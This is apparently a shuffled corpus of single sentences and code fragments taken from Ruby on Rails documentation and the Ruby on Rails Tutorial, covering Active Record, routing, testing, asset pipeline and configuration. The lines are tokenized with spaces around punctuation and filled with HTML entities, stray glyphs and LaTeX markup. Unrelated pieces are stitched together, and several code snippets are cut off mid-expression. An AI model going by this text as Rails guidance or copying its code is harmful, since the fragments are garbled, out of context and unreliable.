Of course , the footer will be ugly without some styling ( Listing ~ \ ref { code : footer _ css } ) .
For one , practical experience shows that authentication on most sites requires extensive customization , and modifying a third-party product is often more work than writing the system from scratch .
Here \ kode { sequence } takes a symbol corresponding to the desired attribute ( such as \ kode { : name } ) and a block with one variable , which we have called ~ \ kode { n } .
To enable this option set :
We can then have ╼ framework features and other gems build on top of that , without having to ╼ worry about API differences between various job runners such as Delayed Job ╼ and Resque ▖
How detailed you want to make your tests is up to you ; a suggested ultra-minimalist template appears in Listing ~ \ ref { code : flash _ test } , which you should complete by replacing \ kode { FILL \ _ IN } with the appropriate code .
Note that \ kode { User ▖ create } , rather than returning \ kode { true } or \ kode { false } , returns the User object itself , which we can optionally assign to a variable ( such as \ kode { foo } in the second command above ) .
Otherwise you won &apos;t be able use page caching and requests for files that exist regularly under the public directory will anyway hit your Rails app .
attr _ internal : captures
Here we pass a \ kode { : collection } parameter with the feed items , which causes \ kode { render } to use the given partial ( \ kode { &apos; feed \ _ item &apos; } in this case ) to render each item in the collection .
You should edit this file to tell others what your application does , how to set it up , and so on .
# # # # The `as` and `object` options
Now make sure that the tests are \ passing :
This is because we don &apos;t need the controller tests ( preferring instead to use an integration test ( Section ~ \ ref { sec : activation _ test _ and _ refactoring } ) ) , so it &apos;s convenient to omit them .
We &apos;ll first look at the outer structure , which consists of embedded Ruby opening with a call to \ kode { form \ _ for } and closing with \ kode { end } :
For example , let &apos;s say we have a standard application layout , but also a special page that requires certain JavaScript that the rest of the site doesn &apos;t need ▖
Appropriately , this section contains some of the most advanced material in the entire tutorial .
You can learn more about querying an Active Record model in the &#91; Active Record ╼ Query Interface &#93; ( active _ record _ querying ▖ html ) guide .
* `engines _ blank _ point` Provides a point-in-initialization to hook into if you wish to do anything before engines are loaded ▖
The simplest rule of thumb is that you should set up a `has _ many : through` relationship if you need to work with the relationship model as an independent entity ▖
TIP : Rails also makes a counter variable available within a partial called by the collection , named after the member of the collection followed by ` _ counter` ▖
( 1 ▖ ▖ 10 ) = = = ( 0 ▖ ▖ 7 ) # = &gt; false
invoke erb
* `config ▖ cache _ classes` controls whether or not application classes and modules should be reloaded on each request ▖
( If you haven &apos;t restarted the Rails server since adding bcrypt , you may have to do so at this time ▖ )
# # # Read
as shown in Listing ~ \ ref { code : capybara _ dsl } .
belongs _ to : customer , counter _ cache : true
# # # # # `prev _ year` , `next _ year`
A mockup of the stats partial .
TIP : If you have any ordering dependency in your initializers , you can control the load order through naming ▖
Unlike the migration for users , the email uniqueness migration is not pre-defined , so we need to fill in its contents with Listing ~ \ ref { code : email _ uniqueness _ index }
A great tool to obfuscate and encode strings , and thus &quot; get to know your enemy &quot; , is the &#91; Hackvertor &#93; ( https : / / hackvertor ▖ co ▖ uk / public ) ▖
Previous versions of Rails used a method called \ kode { attr \ _ accessible } in the \ emph { model } layer to solve this problem , but as of Rails ~ 4 ▖ 0 the preferred technique is to use so-called \ emph { strong parameters } in the controller layer .
* `ensure _ autoload _ once _ paths _ as _ subset` Ensures that the `config ▖ autoload _ once _ paths` only contains paths from `config ▖ autoload _ paths` ▖
The biggest difference is that , while anyone can sign up , only the current user should be able to update their information .
This installs the gem \ kode { coffee-rails } as long as it &apos;s newer than version ~ \ kode { 4 ▖ 0 ▖ 0 } and \ emph { not } newer than \ kode { 4 ▖ 1 } .
* `config ▖ reload _ classes _ only _ on _ change` enables or disables reloading of classes only when tracked files change ▖
╼ * this stuff is worth it , you can buy me a beer in return .
class ReadOnlyModel &lt; ActiveRecord : : Base
This makes sure that there is an \ kode { input } tag with the right name , ( hidden ) type , and email address :
* ` : port` - On the off chance that your mail server doesn &apos;t run on port 25 , you can change it .
In this section , we &apos;ll log the user in with a temporary session cookie that expires automatically upon browser close .
Adding a ``Settings &apos; &apos; link .
For example ,
user = User ▖ create ( name : &quot; David &quot; , occupation : &quot; Code Artist &quot; )
as shown in Listing ~ \ ref { code : layout _ signin _ signout _ links } .
# # # Redefining Methods
config ▖ middleware ▖ use Magical : : Unicorns
It &apos;s important to note that the curly braces for hashes have nothing to do with the curly braces for blocks .
This installs the latest version of the \ kode { uglifier } gem ( which handles file compression for the asset pipeline ) as long as it &apos;s greater than or equal to version ~ \ kode { 1 ▖ 3 ▖ 0 } ---even if it &apos;s , say , version ~ \ kode { 7 ▖ 2 } .
The association method would override the base method and break things ▖
The `parent` method on a nested named module returns the module that contains its corresponding constant :
too _ short : &quot; must have at least % { count } words &quot; ,
$ git rebase upstream / master
Searched in : *
As a rule of thumb you can think of this method as the one that transforms paths into Ruby class or module names , where slashes separate namespaces :
If this discussion seems a bit abstract right now , worry not ; we &apos;ll refer back to this section frequently .
$ git fetch upstream
Hash ▖ new ( middlewares )
Obviously , you &apos;ll want to be a bit more sophisticated than that , but it &apos;s a ╼ start ▖
If you look at the \ href { https : / / github ▖ com / rails / rails / blob / master / activemodel / lib / active _ model / secure _ password ▖ rb } { secure password source code } , you &apos;ll find a comparison like this
In Chapter ~ \ ref { cha : updating _ showing _ and _ deleting _ users } , we finished making a basic Users resource ( filling in all the standard REST actions from Table ~ \ ref { table : RESTful _ users } ) , together with a flexible authentication and authorization system .
In Chapter ~ \ ref { cha : basic _ login } , we &apos;ll then use the authentication machinery from Section ~ \ ref { sec : adding _ a _ secure _ password } to let users log into the site .
&#124; PRIMARY &#124; 4 &#124; const &#124; 1 &#124; &#124;
The router also routes `PATCH` requests to ` / users / : id` to the `update` action .
Finally , why does Ruby correctly interpret the lines
We saw in Section ~ \ ref { sec : a _ users _ resource } how the information in the \ kode { debug } could help us understand what &apos;s going on in our application .
If this object responds to the `middleware` method , its middleware is inserted before `Rack : : Runtime` in the middleware stack .
So far we &apos;ve used strings as hash keys , but in Rails it is much more common to use \ emph { symbols } instead .
The options argument is interpreted as a hash of header names and values ▖
Use it only if you know the hard-coded list is enough in your use case .
&#91; Mpack &#93; ( http : / / pandalabs ▖ pandasecurity ▖ com / mpack-uncovered / ) is a very active and up-to-date attack framework which exploits these vulnerabilities ▖
\ emph { Hint } : To check for a valid \ kode { picture } attribute , use the \ kode { assigns } method mentioned in Section ~ \ ref { sec : activation _ test _ and _ refactoring } to access the micropost in the \ kode { create } action after valid submission .
Action Mailer will automatically send multipart emails if you have different ╼ templates for the same action ▖
* `reverse _ order`
&#124; config / &#124; Configure your application &apos;s routes , database , and more ▖
* Notifies the logs that the request has began ▖
in Listing ~ \ ref { code : micropost _ belongs _ to _ user _ spec } and
To get started , we first generate an integration test file for signing up users , which we &apos;ll call \ kode { users \ _ signup } ( adopting the controller convention of a plural resource name ) :
Visit another page ( such as the Home page ) .
# # # # # ` : class _ name`
all copies or substantial portions of the Software .
The resulting \ kode { gravatar \ _ for } helper appears in Listing ~ \ ref { code : gravatar _ for _ helper } .
= &gt; # &lt; Person id : nil , name : &quot; John Doe &quot; , created _ at : nil , updated _ at : nil &gt;
# # # Accessing
# # # Configuring Action Dispatch
We then apply the migration as usual :
# it will be possible to update email with a duplicated value
Make the following changes to your `Gemfile` .
The technique sprockets uses for fingerprinting is to insert a hash of the ╼ content into the name , usually at the end ▖
&#124; POST &#124; / magazines / : magazine _ id / ads &#124; ads # create &#124; create a new ad belonging to a specific magazine &#124;
For example , we can check if the followed users collection includes another user with the \ kode { include ? } \ method ( Section ~ \ ref { sec : arrays _ and _ ranges } ) , or find objects through the association :
To make use of \ kode { store \ _ location } , we need to add it to the \ kode { logged \ _ in \ _ user } before filter , as shown in Listing ~ \ ref { code : add _ store _ location } .
Section ~ \ ref { sec : hello _ world } shows a first tentative application of MVC , while Section ~ \ ref { sec : mvc _ in _ action } includes a more detailed discussion of MVC in the context of the toy app .
# &lt; User id : 3 , name : &quot; Foo &quot; , email : &quot; foo @ bar ▖ com &quot; , created _ at : &quot; 2013-03-11
# = &gt; { &quot; a &quot; = &gt; 2 }
in Listing ~ \ ref { code : microposts _ create _ tests } .
It &apos;s a good thing , too , because it means we can include the HTML5 shim \ emph { only } for IE browsers less than version ~ 9 , leaving other browsers such as Firefox , Chrome , and Safari unaffected .
You may have noticed that our tests for the layout links test the routing but don &apos;t actually check that the links on the layout go to the right pages .
When a new micropost is made in this way , its \ kode { user \ _ id } is \ emph { automatically } set to the right value .
Are there any tests missing ?
NOTE : _ Use user-supplied command line parameters with caution .
```nginx
You probably want to do something upon a successful submission ▖
To save having to call `constantize` on the `author _ class` result all the time , ╼ you could instead just override the `author _ class` getter method inside the ╼ `Blorgh` module in the `lib / blorgh ▖ rb` file to always call `constantize` on the ╼ saved value before returning the result :
In either case , the result should look something like Figure ~ \ ref { fig : riding _ rails } .
t ▖ prev _ quarter # = &gt; Mon , 08 Feb 2010
At this point , in real life I would consider writing an integration test to capture the behavior described above .
`Array # to _ param` calls `to _ param` on the elements and joins the result with &quot; / &quot; :
( Recall the association of HTTP verbs with REST actions from Table ~ \ ref { table : RESTful _ users } ▖ )
# Speed up tests by lowering bcrypt &apos;s cost function .
person = Person ▖ new ( name : &quot; John Doe &quot; )
# Rails ▖ backtrace _ cleaner ▖ remove _ silencers !
The routes for the \ kode { home } and \ kode { help } actions in the Static Pages controller .
Unless the name of the join table is explicitly specified by using the ` : join _ table` option , Active Record creates the name by using the lexical order of the class names ▖
The `Rails : : Server` inherits from `Rack : : Server` and calls the `Rack : : Server # start` method this way :
in Listing ~ \ ref { code : user _ show _ page _ test } .
A custom Home page .
At the root of this brand new engine &apos;s directory lives a `blorgh ▖ gemspec` file ▖ ╼
Friendly forwarding redirects users where they wanted to go after logging in .
( In fact , some languages , especially Perl , sometimes call hashes \ emph { associative arrays } for this reason ▖ )
However , as ╼ part of the rewrite , the following features have been removed from the encoder :
NOTE : Defined in `active _ support / core _ ext / string / starts _ ends _ with ▖ rb` .
* PostgreSQL : &#91; Using EXPLAIN &#93; ( http : / / www ▖ postgresql ▖ org / docs / current / static / using-explain ▖ html )
Adding the \ kode { belongs \ _ to } associations to the Relationship model .
customer =
This helper counts characters by default , but you can split the value in a ╼ different way using the ` : tokenizer` option :
To get the previous behavior it is needed to explicitly remove the ╼ `default _ scope` condition using `unscoped` , `unscope` , `rewhere` or ╼ `except` .
# # # Interpreting EXPLAIN
The most generic way to jump to other days is `advance` ▖
Supported options are :
Find an online version of the Ruby API and read about the Hash method \ kode { merge } .
Be sure to uncomment the lines in the test group relevant for your system .
# # # Active Support
In this section , we &apos;ll show how to use \ href { https : / / github ▖ com / guard / guard } { Guard } to automate the running of the tests .
TIP : This is useful when you &apos;re rendering a small snippet of HTML code .
# &lt; objects type = &quot; array &quot; &gt;
has _ many : confirmed _ orders , - &gt; { where confirmed : true } ,
render &quot; / path / to / rails / app / views / books / edit &quot;
Do ╼ note that using force push may result in commits being lost on the remote branch ; use it with care .
Gemfile
Similarly , to test successful signin , we could add this :
So , for ╼ a class `Book` , you should have a database table called * * books * * ▖
* How to use partials to DRY up your views .
Both of these views are just placeholders : they have a top-level heading ( inside the \ kode { h1 } tag ) and a paragraph ( \ kode { p } tag ) with the full path to the corresponding file .
The way to achieve this in Rails is to use a facility called \ emph { partials } .
# = &gt; 555-1234
Integration tests effectively simulate a browser clicking from page to page .
This will generate this HTML output :
To override this behavior ( and force a database read ) , pass `true` as the `force _ reload` argument .
Verify that the right page template is rendered
24 , 25 , 26 , 27 , 28 , 29 , 30 , 31 , 32 , 33 , 34 , 35 , 36 , 37 , 38 , 39 , 40 , 41 , 42 ,
&lt; h1 &gt; Articles &lt; / h1 &gt;
# # # # text _ field
= &gt; 1 ▖ ▖ 5
# collection has not been loaded , it is equivalent to
You may also want to follow the setup instructions for \ href { https : / / github ▖ com / mhartl / rails _ tutorial _ sublime _ text } { Rails Tutorial Sublime Text } at this time
By passing the optional parameters \ kode { name : string } and \ kode { email : string } , we tell Rails about the two attributes we want , along with what types those attributes should be ( in this case , \ kode { string } ) .
Writing the application code needed to get the tests in Listing ~ \ ref { code : micropost _ access _ control } to pass requires a little refactoring first .
Listing ~ \ ref { code : layout _ links _ test } uses some of the more advanced options of the \ kode { assert \ _ select } method , seen before in Listing ~ \ ref { code : title _ tests } and Listing ~ \ ref { code : contact _ page _ test } .
As noted in Section ~ \ ref { sec : a _ hashed _ password } , ``unencrypted password &apos; &apos; is a misnomer , as the secure password is \ emph { hashed } , not encrypted .
as shown in Listing ~ \ ref { code : full _ title _ helper _ tests } .
# # # Creating Rails Environments
Also &quot; an SQLite database &quot; .
A ╼ great place for that would be at ` / articles / new` ▖
Software development is usually an iterative process---you write code until it starts getting ugly , and then you refactor it---but for brevity the tutorial presentation is streamlined a bit .
TIP : You can see all of the command line options that the Rails application ╼ builder accepts by running `rails new -h` .
# # # Class Attributes
How cool is that ?
Active Support defines `Date ▖ current` to be today in the current time zone ▖
The default \ kode { Gemfile } in the \ kode { hello \ _ app } directory .
The method `to _ sentence` turns an array into a string containing a sentence that enumerates its items :
There is one break with past convention worth noting : the interface to the Microposts resource will run principally through the Profile and Home pages , so we won &apos;t need actions like \ kode { new } or \ kode { edit } in the Microposts controller ; we &apos;ll need only \ kode { create } and \ kode { destroy } .
\ href { http : / / online ▖ pragmaticstudio ▖ com / } { Pragmatic Studio } : Online Ruby and Rails courses from Mike and Nicole Clark .
invoke test _ unit
12345678 ▖ 05 ▖ to _ s ( : delimited ) # = &gt; 12,345,678 ▖ 05
Rails has 5 initialization events which can be hooked into ( listed in the order that they are run ) :
The best way to understand how the code in Listing ~ \ ref { code : first _ create _ action } works is to \ emph { submit } the form with some invalid signup data .
Here the option \ kode { dependent : : destroy } arranges for the dependent microposts to be destroyed when the user itself is destroyed .
belongs _ to : imageable , polymorphic : true
&gt; &gt; p ▖ save
The `body` param is required by Sprockets .
The final command here arranges to push the \ kode { static-pages } topic branch up to Bitbucket .
add _ header Cache-Control public ;
The code
validates : age , numericality : true , on : : update
# # # # `reverse _ update`
The second render just defines the partial template we want to render , ╼ `comments / form` ▖
from Listing ~ \ ref { code : respond _ to _ password _ digest } to
# config ▖ assets ▖ manifest = YOUR _ PATH
ensures that Guard doesn &apos;t run all the tests after a failing test passes ( to speed up the Red-Green-Refactor cycle ) .
# MyApp / app / models / blorgh / article ▖ rb
* `config ▖ action _ view ▖ default _ form _ builder` tells Rails which form builder to use by default ▖
If you want to use the new `secrets ▖ yml` convention to store your application &apos;s ╼ secrets , you need to :
Although the view will exist as a single page of code , each profile will be customized using information retrieved from the site &apos;s database .
# # = &gt; &lt; label for = &quot; article _ title &quot; &gt; Title &lt; / label &gt;
def stringify _ keys
In Listing ~ \ ref { code : word _ class } , note that checking that the word is its own reverse involves accessing the word inside the \ kode { Word } class .
RESTful routes provided by the custom rules in resource in Listing ~ \ ref { code : following _ followers _ actions _ routes } .
app
There &apos;s nothing there yet , though , so let &apos;s get busy deploying .
If you require an `Array` , use `where ( ▖ ▖ ▖ ) ▖ to _ a` .
alias _ method : original _ process , : process
If you wait a couple minutes and reload the pages , you &apos;ll see how the text gets automatically updated based on the new time .
{ code : demo _ length _ validation } works on the production app ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-debcc6 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ \ section { Conclusion } % ( fold ) ╼ \ label { sec : toy _ app _ conclusion } ╼ ╼
Cookies expire \ texttt { 20 ▖ years ▖ from \ _ now }
You can run tests only for a particular component ( e ▖ g ▖ Action Pack ) ▖
With this change , you should finally be able to create new articles .
With the code in this form , there will likely be a problem if the ` @ book` variable is `nil` ▖
In this case , these routes are \ kode { root \ _ path } and \ kode { root \ _ url } , with the only difference being that the latter includes the full URL :
If any of the files in the manifest have changed between requests , the server ╼ responds with a new compiled file .
# Person ▖ exists ? ( &#91; &apos;
# # # Methods defined in Active Record fixtures
Route globbing is a way to specify that a particular parameter should be matched to all the remaining parts of a route ▖
* The &#91; Ruby on Rails Tutorial &#93; ( http : / / railstutorial ▖ org / book )
The method `is _ missing ? ` provides a way to distinguish both cases :
The user home page after deleting the second-most-recent micropost ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / home _ post _ delete _ bootstrap-full ▖ png } { ( full size ) }
\ label { fig : micropost _ image _ mockup } } ╼ \ end { figure } ╼ ╼ \ subsection { Basic image upload } % ( fold ) ╼ \ label { sec : basic _ image _ upload } ╼ ╼
This will allow us to add customizations based on signin status and based on the identity of the current user .
&#124; DELETE &#124; / magazines / : magazine _ id / ads / : id &#124; ads # destroy &#124; delete a specific ad belonging to a specific magazine &#124;
root to : &quot; home # index &quot;
&quot; &quot; ▖ html _ safe + &quot; &lt; &quot; # = &gt; &quot; &amp; lt ; &quot;
# # # # Options for `has _ and _ belongs _ to _ many`
You &apos;re free to add
You can specify a single constraint to apply to a number of routes by using the block form :
assemblies ▖ exists ? ( ▖ ▖ ▖ )
╼ To get help on this sample app , see the
Array ▖ wrap ( &#91; 1 , 2 , 3 &#93; ) # = &gt; &#91; 1 , 2 , 3 &#93;
The inheritance hierarchy for the ( non-built-in ) \ kode { Word } class from Listing ~ \ ref { code : word _ class } .
By default , \ kode { rake test } shows red when the tests fail , but doesn &apos;t show green when the tests pass .
# Pass { page _ cache : false } argument to Lifo : : Cache .
The `subclasses` method returns the subclasses of the receiver :
To keep rails secure by default , `deep _ munge` replaces some of the values with ╼ `nil` ▖
instead , and it would work just the same , but ( as mentioned briefly in Section ~ \ ref { sec : exercises _ layout _ link _ tests } ) the conventional order for the arguments to \ kode { assert \ _ equal } is \ emph { expected } , \ emph { actual } :
Another strategy recommended by multiple readers is simply to do the tutorial twice ; you may be surprised at how much you learned the first time ( and how much easier it is the second time through ) .
It is possible to send email to one or more recipients in one email ( e ▖ g ▖ , ╼ informing all admins of a new signup ) by setting the list of emails to the ` : to` ╼ key ▖
No logging in
( Although the \ kode { authenticated ? } \ method in Listing ~ \ ref { code : authenticated _ p } is tied specifically to the remember digest , it will turn out to be useful in other contexts as well , and we &apos;ll generalize it in Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } ▖ )
* = require _ self
Having written some simple Cucumber scenarios , it &apos;s worth comparing the result to the equivalent RSpec examples .
In Chapter ~ \ ref { cha : sign _ up } , we implemented user signup by making an HTML form that issued an HTTP \ texttt { POST } request to the \ kode { create } action in the Users controller .
Before moving on , you should verify that the test suite passes :
Many languages provide a syntactic shortcut for this operation ; in Ruby ( and in C , C + + , Perl , Python , Java , etc ▖ ) , it can also appear as follows :
This is particularly true ╼ for ORM frameworks in general ▖
* `config ▖ exceptions _ app` sets the exceptions application invoked by the ShowException middleware when an exception happens ▖
` # as _ json` for objects with time component ( `Time` , `DateTime` , `ActiveSupport : : TimeWithZone` ) ╼ now returns millisecond precision by default ▖
* How to add additional code to be run at application start time .
# # # # # `years _ ago` , `years _ since`
In this case , using ` @ customer ▖ confirmed _ orders ▖ create` or ` @ customer ▖ confirmed _ orders ▖ build` will create orders where the confirmed column has the value `true` .
# # # # Cherry-picking a Definition
* `config ▖ action _ view ▖ cache _ template _ loading` controls whether or not templates should be reloaded on each request ▖
Our main testing tools will be \ emph { controller tests } ( starting in this section ) , \ emph { model tests } ( starting in Chapter ~ \ ref { cha : modeling _ users } ) , and \ emph { integration tests } ( starting in Chapter ~ \ ref { cha : sign _ up } ) .
The unique alternative value at the moment is ` : yui` , which uses the `yui-compressor` gem .
# # # config / environments / development ▖ rb
The migration for enforcing email uniqueness .
Some commands may produce errors depending on your system ; rather than attempt the \ href { http : / / en ▖ wikipedia ▖ org / wiki / Sisyphus } { Sisyphean } task of documenting all such errors in this tutorial , I will delegate to the ``Google the error message &apos; &apos; algorithm , which among other things is good practice for real-life software development .
has _ and _ belongs _ to _ many : parts
Edit the `form _ for` line inside `app / views / articles / new ▖ html ▖ erb` to look like ╼ this :
1 ▖ object _ id # = &gt; 3
As with model inheritance , both the Users and Microposts controllers gain a large amount of functionality by inheriting from a base class ( in this case , \ kode { ActionController : : Base } ) , including the ability to manipulate model objects , filter inbound HTTP requests , and render views as HTML ▖ Since all Rails controllers inherit from \ kode { ApplicationController } , rules defined in the Application controller automatically apply to every action in the application .
With `through : : sections` specified , Rails will now understand :
c1 = Client ▖ find ( 1 )
Then we &apos;ll verify that the correct users appear on the first page of results .
Listing ~ \ ref { code : hello _ action } shows the resulting definition of \ kode { hello } , which uses the \ kode { render } function to return the text ``hello , world ! &apos; &apos; .
# # # # `titleize`
If you want to use Spring as your application preloader you need to :
And you have a view file `app / views / books / index ▖ html ▖ erb` :
Configuring a production site to use SSL is painful and error-prone , and among other things it involves purchasing an \ emph { SSL certificate } for your domain .
in Listing ~ \ ref { code : before _ create _ remember _ token } .
# Blorgh / lib / concerns / models / article
in Listing ~ \ ref { code : signup _ form } .
Associations are implemented using macro-style calls , so that you can declaratively add features to your models ▖
The password reset mailer method needed to get this working is nearly identical to the mailer for account activation developed in Section ~ \ ref { sec : account _ activation _ emails } .
&#124; `Mouse` &#124; `mice` &#124;
I shall be late ! &quot; ▖ truncate _ words ( 4 , omission : &apos; &amp; hellip ; &apos; )
d ▖ prev _ week ( : friday ) # = &gt; Fri , 30 Apr 2010
The method `truncate _ words` returns a copy of its receiver truncated after a given number of words :
The uploader in Section ~ \ ref { sec : basic _ image _ upload } is a good start , but it has significant limitations .
These fingerprinted names are used by the Rails helpers in place of the manifest ╼ name .
( There is some potential for confusion here .
In all of these methods , `association` is replaced with the symbol passed as the first argument to `belongs _ to` ▖
stylesheet _ url &quot; application &quot; # = &gt; http : / / www ▖ example ▖ com / assets / application ▖ css
has _ many : books
Now that we have a correctly generated email as in Listing ~ \ ref { code : account _ activation _ email } , we need to write an \ kode { edit } action in the Account Activations controller to activate the user .
do &#124; admin &#124;
* * * Primary keys * * - By default , Active Record will use an integer column named ╼ `id` as the table &apos;s primary key ▖
Here we &apos;ve passed the id of the user to \ kode { User ▖ find } ; Active Record returns the user with that ~ id .
By including \ kode { name : string } and \ kode { email : string } , we have arranged for the User model to have the form shown in Figure ~ \ ref { fig : demo _ user _ model } .
Sprockets sets a `must-revalidate` Cache-Control HTTP header to reduce request ╼ overhead on subsequent requests - on these the browser gets a 304 ( Not Modified ) ╼ response .
Here &apos;s an example of the `set _ helpers _ path` initializer from Action Controller :
In development mode , or if the asset pipeline is disabled , when these files are ╼ requested they are processed by the processors provided by the `coffee-script` ╼ and `sass` gems and then sent back to the browser as JavaScript and CSS ╼ respectively ▖
To assign a specific layout for the entire application , use a `layout` declaration in your `ApplicationController` class :
For more information on RVM , I also recommend taking a look at the article \ href { http : / / strandcode ▖ com / 2013 / 07 / 11 / ruby-version-manager-rvm-overview-for-rails-newbs / } { Ruby Version Manager ( RVM ) Overview for Rails Newbs }
This uses the built-in Rails function \ kode { stylesheet \ _ link \ _ tag } ( which you can read more about at the \ href { http : / / api ▖ rubyonrails ▖ org / classes / ActionView / Helpers / AssetTagHelper ▖ html # method-i-stylesheet _ link _ tag } { Rails API } ) to include \ kode { application ▖ css } for all \ href { http : / / www ▖ w3 ▖ org / TR / CSS2 / media ▖ html } { media types } ( including computer screens and printers ) .
Keep in mind , of course , that anything generated with these commands inside of ╼ an engine that has `isolate _ namespace` in the `Engine` class will be namespaced .
One option is to use a combination of the id and the name , such as \ kode { @ 1-michael-hartl } .
class CreateOrders &lt; ActiveRecord : : Migration
╼ $ bundle exec rake -T
All the examples so far have used \ emph { double-quoted strings } , but Ruby also supports \ emph { single-quoted } strings .
The route now exists , but the controller that this route goes to does not ▖
actually works !
Post to the sessions path with an invalid \ kode { params } hash .
xml ▖ pubDate ( item _ pubDate ( item ) )
def start
# # # `blank ? ` and `present ? `
Connection : keep-alive
class Coffee &lt; ActiveRecord : : Base
╼ * ---------------------------------------------------------------------------- ╼ * /
That class served as a useful example , but it lacked the critical property of \ emph { persistence } : when we created a User object at the Rails console , it disappeared as soon as we exited .
Basic access control tests for relationships ▖
&lt; % = f ▖ label : text % &gt; &lt; br &gt;
- &gt; 0 ▖ 0115s
# = &gt; 1 ▖ 000,000 %
as shown in Listing ~ \ ref { code : default _ gitignore } .
class GoodnessValidator
* `force _ plural` allows pluralized model names ▖
Adding a resource for password resets .
* If the returned value from `to _ ary` is neither `nil` nor an `Array` object , `Kernel # Array` raises an exception , while `Array ▖ wrap` does not , it just returns the value .
You can nest resources within other nested resources if you like ▖
* Checks pending migrations and raises `ActiveRecord : : PendingMigrationError` if any migrations are pending .
The default error message for this option is _ &quot; must be less ╼ than or equal to % { count } &quot; _ .
render layout : false
This code arranges to include the application stylesheet and JavaScript , which are part of the asset pipeline ( Section ~ \ ref { sec : the _ asset _ pipeline } ) , together with the Rails method \ kode { csrf \ _ meta \ _ tags } , which prevents \ href { http : / / en ▖ wikipedia ▖ org / wiki / Cross-site _ request _ forgery } { cross-site request forgery } ( CSRF ) , a type of malicious web attack .
You can also unscope specific `where` clauses ▖
% w ( Earth ) ▖ to _ sentence # = &gt; &quot; Earth &quot;
as shown in Listing ~ \ ref { code : bootstrap _ css } .
* The URL pattern to match
&lt; % = f ▖ text _ field : title % &gt;
The `collection ▖ delete` method removes one or more objects from the collection by deleting records in the join table ▖
When &quot; true &quot; or &quot; false &quot; are used as defined in Ruby use regular font ▖
# # # # Joining Nested Associations ( Single Level )
We see now why this is a cheat : alas , \ kode { sign \ _ in } doesn &apos;t currently exist .
It should be wrapped to 72 ╼ characters ▖
The way to do this is with a \ href { http : / / en ▖ wikipedia ▖ org / wiki / Callback _ ( computer _ science ) } { \ emph { callback } } , which is a method that gets invoked at a particular point in the lifecycle of an Active Record object .
It is possible , of course , to arrange for this information to be handled securely ( by having Git ignore it , for example ) , but this is error-prone and requires significant expertise .
A test of a successful edit ▖
get &apos; profile &apos; , to : &apos; users # show&apos;
# &lt; id type = &quot; integer &quot; &gt; 4583 &lt; / id &gt;
Add tests to make sure that these links \ emph { don &apos;t } appear when a user isn &apos;t signed in .
&lt; / body &gt;
in Listing ~ \ ref { code : home _ feed _ test } .
hash &#91; : b &#93; &#91; : d &#93; = = &#91; 3 , 4 &#93; # = &gt; true
t ▖ next _ quarter # = &gt; Sun , 08 Aug 2010
# &lt; url-id &gt; aaron-batalion &lt; / url-id &gt;
* `ActiveSupport : : Cache : : Strategy : : LocalCache` serves as a basic memory backed cache ▖
Diffs from the 2nd edition
&lt; % content _ for : stylesheets do % &gt;
It is my hope that these changes will make the third edition of the \ emph { Ruby on Rails Tutorial } accessible to an even broader audience than previous versions .
With these routes now defined , the tests for the Help , About , and Contact pages should pass :
set _ callback : save , : around , - &gt; ( r , &amp; block ) { stuff ; result = block ▖ call ; stuff }
This includes some additional divisions , some CSS classes , and the start of our site navigation .
For example , RedCloth translates ` _ test _ ` to &amp; lt ; em &amp; gt ; test &amp; lt ; em &amp; gt ; , which makes the text italic ▖
&lt; wait a while &gt;
* `has _ many : through`
Skeleton for a \ kode { shuffle } method attached to the \ kode { String } class .
╼ ╼ \ begin { figure } ╼ \ begin { center } ╼ \ imagebox { images / figures / login _ page _ protected _ mockup ▖ png } ╼ \ end { center } ╼ \ caption { A mockup of the result of visiting a protected page \ label { fig : login _ page _ protected _ mockup } } ╼ \ end { figure } ╼ ╼ \ subsection { Requiring logged-in users } % ( fold ) ╼ \ label { sec : requiring _ logged _ in _ users } ╼ ╼
# # # Update
# non-JS / CSS are already added ) config ▖ assets ▖ precompile + = % w ( search ▖ js )
Now , a `GET` request to ` / photos` would succeed , but a `POST` request to ` / photos` ( which would ordinarily be routed to the `create` action ) will fail .
TIP : For more information on the dangers of SQL injection , see the &#91; Ruby on Rails Security Guide &#93; ( security ▖ html # sql-injection ) .
Thus , we have \ kode { User } instead \ kode { Users } .
Note that , because the remember token in the database is encrypted , we first need to encrypt the token from the cookie before using it to find the user in the database .
This simply updates the database with our new \ kode { users } data model .
third :
The result is that the \ kode { full \ _ title } method is \ href { http : / / catb ▖ org / jargon / html / A / automagically ▖ html } { automagically } available in all our views .
We &apos;ll look more into models in ╼ a future section , when we &apos;re writing the engine .
incipal th
* * `ActionDispatch : : Session : : CookieStore` * *
╼ ╼ \ subsection { Comments } % ( fold ) ╼ \ label { sec : comments } ╼ ╼ Ruby \ emph { comments } start with the pound sign ~ \ kode { \ # } ( also called the ``hash mark &apos; &apos; or ( more poetically ) the ``octothorpe &apos; &apos; ) and extend to the end of the line ▖
This association indicates that each instance of a model contains or possesses one instance of another model ▖
def comment _ params
def time _ since _ created
Fingerprint will be added to the filename if config ▖ assets ▖ digest is set to true .
If you do not , Rails will throw an error .
( Given its length and advanced nature , I recommend just copy-and-pasting the contents of Listing ~ \ ref { code : guardfile } ▖ )
The `indent ! ` method performs indentation in-place .
If you take a look at the default routes file , you &apos;ll see that it &apos;s quite a mess , but it &apos;s a useful mess---full of commented-out example route mappings .
Here we &apos;re using the Unix \ kode { ls } command to list the contents of the \ kode { app / controllers / } directory and the \ kode { rm } command to remove it ( Table ~ \ ref { table : unix _ commands } ) .
&#91; 3 ▖ 4 , -45 ▖ 6 &#93; ▖ to _ query ( &apos; sample &apos; )
orphan ▖ name # = &gt; &quot; M &quot;
( In fact , the \ href { http : / / www ▖ railstutorial ▖ org } { Ruby on Rails Tutorial site } lives at Heroku ; if you &apos;re reading this book online , you &apos;re looking at a Heroku-hosted site right now ! )
If you pass any other options , it will send those options to the ╼ validator class as `options` :
in Listing ~ \ ref { code : password _ resets _ resource } .
I didn &apos;t remember offhand how to get this URL inside a Rails application , so I Googled ``rails request previous url &apos; &apos; and found a \ href { http : / / stackoverflow ▖ com / questions / 4652084 / ruby-on-rails-how-do-you-get-the-previous-url } { Stack Overflow thread } with the answer .
text _ area ( : comment , : text , size : &quot; 20x30 &quot; )
The method `multiple _ of ? ` tests whether an integer is multiple of the argument :
The flash message for a failed login .
add ( # { severity } , message , progname , &amp; block ) # add ( DEBUG , message , progname , &amp; block )
It ╼ also has the ability to update information on the page ▖
